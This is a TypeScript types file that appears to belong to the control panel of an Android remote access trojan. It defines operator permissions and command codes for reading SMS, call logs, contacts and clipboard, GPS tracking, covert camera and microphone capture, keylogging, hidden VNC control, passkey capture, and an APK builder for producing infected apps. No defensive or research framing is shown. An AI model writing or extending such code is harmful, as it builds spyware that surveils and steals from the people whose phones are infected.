export type UserRole = 'admin' | 'user';

export type Permission =
  | 'dashboard:view'
  | 'device:view'
  | 'device:sms'
  | 'device:calls'
  | 'device:contacts'
  | 'device:gps'
  | 'device:camera'
  | 'device:mic'
  | 'device:files'
  | 'device:wifi'
  | 'device:clipboard'
  | 'device:notifications'
  | 'device:permissions'
  | 'device:apps'
  | 'device:fason'
  | 'device:screen'
  | 'device:hvnc'
  | 'device:keylogger'
  | 'device:command'
  | 'device:delete'
  | 'builder:access'
  | 'logs:view'
  | 'logs:clear'
  | 'users:manage'
  | 'settings:view'
  | 'settings:edit'
  | 'stats:view'
  | 'files:download';

export const ALL_PERMISSIONS: Permission[] = [
  'dashboard:view', 'device:view', 'device:sms', 'device:calls',
  'device:contacts', 'device:gps', 'device:camera', 'device:mic',
  'device:files', 'device:wifi', 'device:clipboard', 'device:notifications',
  'device:permissions', 'device:apps', 'device:fason', 'device:screen', 'device:hvnc', 'device:keylogger', 'device:command',
  'device:delete',
  'builder:access', 'logs:view', 'logs:clear', 'users:manage',
  'settings:view', 'settings:edit', 'stats:view', 'files:download',
];

export const DEFAULT_USER_PERMISSIONS: Permission[] = [
  'dashboard:view', 'device:view', 'device:sms', 'device:calls',
  'device:contacts', 'device:gps', 'device:camera', 'device:mic',
  'device:files', 'device:wifi', 'device:clipboard', 'device:notifications',
  'device:permissions', 'device:apps', 'device:fason', 'device:screen', 'device:hvnc', 'device:keylogger', 'device:command',
  'logs:view', 'settings:view',
];

export const PERMISSION_GROUPS = [
  {
    label: 'Device Features',
    permissions: [
      { key: 'dashboard:view' as Permission, label: 'View Dashboard', description: 'Access the main dashboard' },
      { key: 'device:view' as Permission, label: 'View Devices', description: 'View device list and basic info' },
      { key: 'device:sms' as Permission, label: 'SMS', description: 'Access SMS messages' },
      { key: 'device:calls' as Permission, label: 'Calls', description: 'Access call logs' },
      { key: 'device:contacts' as Permission, label: 'Contacts', description: 'Access contacts list' },
      { key: 'device:gps' as Permission, label: 'GPS Tracking', description: 'GPS location tracking' },
      { key: 'device:camera' as Permission, label: 'Camera', description: 'Camera capture' },
      { key: 'device:mic' as Permission, label: 'Microphone', description: 'Microphone recording' },
      { key: 'device:files' as Permission, label: 'Files', description: 'File browser access' },
      { key: 'device:wifi' as Permission, label: 'WiFi', description: 'WiFi network data' },
      { key: 'device:clipboard' as Permission, label: 'Clipboard', description: 'Clipboard data' },
      { key: 'device:notifications' as Permission, label: 'Notifications', description: 'Device notifications' },
      { key: 'device:permissions' as Permission, label: 'App Permissions', description: 'View app permissions' },
      { key: 'device:apps' as Permission, label: 'Installed Apps', description: 'View installed applications' },
      { key: 'device:fason' as Permission, label: 'Fason Manager', description: 'Fason app management' },
       { key: 'device:screen' as Permission, label: 'Live Screen', description: 'Live screen streaming and remote control' },
       { key: 'device:hvnc' as Permission, label: 'HVNC', description: 'Hidden virtual display control' },
       { key: 'device:keylogger' as Permission, label: 'Keylogger', description: 'View captured keystroke data' },
      { key: 'device:command' as Permission, label: 'Send Commands', description: 'Send commands to devices' },
      { key: 'device:delete' as Permission, label: 'Delete Devices', description: 'Remove devices and their data' },
    ],
  },
  {
    label: 'System',
    permissions: [
      { key: 'builder:access' as Permission, label: 'APK Builder', description: 'Build and download APK files' },
      { key: 'logs:view' as Permission, label: 'View Logs', description: 'View system logs' },
      { key: 'logs:clear' as Permission, label: 'Clear Logs', description: 'Delete all system logs' },
      { key: 'users:manage' as Permission, label: 'Manage Users', description: 'Create, edit, delete users and permissions' },
      { key: 'settings:view' as Permission, label: 'View Settings', description: 'View system configuration' },
      { key: 'settings:edit' as Permission, label: 'Edit Settings', description: 'Modify system configuration' },
      { key: 'stats:view' as Permission, label: 'View Statistics', description: 'Access system statistics' },
      { key: 'files:download' as Permission, label: 'Download Files', description: 'Download photos, recordings, and files from devices' },
    ],
  },
];

/** Admin gets all permissions; user gets their assigned list. Fail-closed: returns empty on error. */
export function resolvePermissions(role: UserRole, permissionsJson: string): Permission[] {
  if (role === 'admin') return [...ALL_PERMISSIONS];
  try {
    const parsed = JSON.parse(permissionsJson);
    if (!Array.isArray(parsed)) return [];
    return parsed.filter((p: string) => ALL_PERMISSIONS.includes(p as Permission)) as Permission[];
  } catch {
    return [];
  }
}

/** Command protocol codes — matches Android Protocol.java channel codes. */
export const CMD = {
  FILES: '0xFI',
  SMS: '0xSM',
  CALLS: '0xCL',
  CONTACTS: '0xCO',
  MIC: '0xMI',
  LOCATION: '0xLO',
  WIFI: '0xWI',
  PERMISSIONS: '0xPM',
  APPS: '0xIN',
  PERM_CHECK: '0xGP',
  CAMERA: '0xCA',
  CLIPBOARD: '0xCB',
  NOTIFICATIONS: '0xNO',
  FASON: '0xFM',
  INFO: '0xIF',
  SCREEN: '0xSC',
   SCREEN_CTRL: '0xST',
   KEYLOGGER: '0xKL',
   WEBRTC_OFFER: '0xWO',
   WEBRTC_ANSWER: '0xWA',
   WEBRTC_ICE: '0xWC',
   HVNC: '0xHV',
   HVNC_CTRL: '0xHC',
   HVNC_OFFER: '0xHO',
   HVNC_ANSWER: '0xHA',
   HVNC_ICE: '0xHI',
   PASSKEY: '0xPK',
} as const;

export type CmdType = typeof CMD[keyof typeof CMD];

/** Actions accepted by the WebRTC control data channel and its REST fallback. */
export const SCREEN_ACTION = {
  STATUS: 'status',
  TAP: 'tap',
  SWIPE: 'swipe',
  GESTURE: 'gesture',
  TOUCH_START: 'touchStart',
  TOUCH_MOVE: 'touchMove',
  TOUCH_END: 'touchEnd',
  KEY: 'key',
  TEXT: 'text',
  VOLUME: 'volume',
} as const;

export type ScreenAction = typeof SCREEN_ACTION[keyof typeof SCREEN_ACTION];

export interface CommandPayload {
  type: CmdType;
  action?: string;
  [key: string]: unknown;
}

export interface ApiResponse<T = unknown> {
  success: boolean;
  data?: T;
  error?: string;
}

export interface JwtPayload {
  userId: number;
  username: string;
  email: string;
  role: UserRole;
  permissions: Permission[];
  sessionId?: string;
}

export interface ServerConfig {
  port: number;
  debug: boolean;
  socket: {
    pingInterval: number;
    pingTimeout: number;
    maxHttpBufferSize: number;
    transports: string[];
    cors: {
      origin: string | boolean;
      methods: string[];
    };
  };
  rateLimit: {
    windowMs: number;
    maxRequests: number;
  };
  build: {
    timeout: number;
  };
  security: {
    sessionTimeout: number;
    loginAttempts: number;
    loginLockout: number;
  };
  logger: {
    maxDbLogs: number;
    files: {
      maxSize: string;
      errorRetention: string;
    };
    console: {
      enabled: boolean;
    };
  };
}
